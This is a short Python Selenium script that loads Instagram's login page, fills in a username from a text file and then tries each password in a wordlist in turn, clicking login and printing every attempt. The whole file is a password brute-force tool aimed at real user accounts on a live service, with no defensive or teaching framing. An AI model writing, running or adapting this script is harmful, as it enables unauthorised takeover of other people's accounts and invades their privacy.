from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys


# get instagram page
driver = webdriver.Chrome()
driver.get("https://www.instagram.com")
time.sleep(2)


# get tags then try pass.txt if succes y'll get redirect into the homepage xD
username = driver.find_element_by_name('username')
password = driver.find_element_by_name('password')
nologin = driver.find_element_by_xpath(
    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[1]/div[3]/button')
login = driver.find_element_by_xpath(
    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[1]/div[3]/button')
user_txt = open('user.txt', 'r')
for line2 in user_txt:
    username.send_keys(line2)
    time.sleep(2)
    break
pass_lst = open('pass.lst', 'r')

for line in pass_lst:
    password.send_keys(Keys.CONTROL, 'a')
    time.sleep(2)
    password.send_keys(line)
    login.click()
    time.sleep(1)
    print("Last password tried:", line)

time.sleep(3)
pass_lst.close()
user_txt.close()
# end
driver.close()
